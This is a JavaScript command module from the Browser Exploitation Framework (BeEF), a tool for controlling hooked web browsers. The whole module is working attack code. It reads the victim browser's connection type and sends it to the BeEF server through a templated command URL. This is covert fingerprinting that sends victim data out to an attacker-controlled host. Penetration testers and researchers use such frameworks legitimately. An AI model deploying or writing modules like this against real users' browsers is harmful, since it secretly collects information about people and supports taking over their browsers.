//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var connection_type = beef.net.connection.type();
  beef.net.send('<%= @command_url %>', <%= @command_id %>, "connection="+connection_type);
});
